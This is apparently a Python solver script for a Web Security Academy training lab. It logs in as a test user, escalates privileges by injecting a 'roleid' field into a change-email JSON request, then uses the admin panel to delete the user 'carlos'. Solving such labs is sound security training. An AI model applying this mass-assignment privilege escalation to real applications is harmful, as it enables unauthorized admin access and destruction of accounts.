from web_security_academy.core.logger import logger
from urllib.parse import urljoin
from bs4 import BeautifulSoup


def solve_lab(session):
    # Logging in
    url = urljoin(session.url, "/login")
    username, password = "wiener", "peter"
    data = {"username": username, "password": password}
    logger.info(f'Logging in with the credentials "{username}:{password}"')
    resp = session.post(url, data=data)

    soup = BeautifulSoup(resp.text, "lxml")
    invalid_creds = soup.find(text="Invalid username or password.")
    if invalid_creds:
        logger.failure("Invalid credentials.")
        return
    else:
        logger.success("Successfully logged in.")

    # Visiting /admin
    url = urljoin(url, "/my-account/change-email")
    data = {"email": "weiner@normal-user.net", "roleid": 2}

    logger.info(f'POST-ing the following JSON to "{url}":')
    logger.info(data)
    resp = session.post(url, json=data)
    if resp.status_code != 200:
        logger.failure("GET request unsuccessful.")
        return
    else:
        logger.success("Success.")

    url = urljoin(url, "/admin")
    logger.info(f'Visiting "{url}" with the following cookies:')
    logger.info(session.cookies.get_dict())
    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure("Unable to visit URL.")
        return
    else:
        logger.success("GET request came back with a successful response.")

    # Deleting user 'carlos'
    logger.info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        url = urljoin(url, tag.get("href"))
        logger.success(f"Found URL: {url}")

    logger.info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure("GET request unsuccessful.")
    else:
        logger.success("Success.")
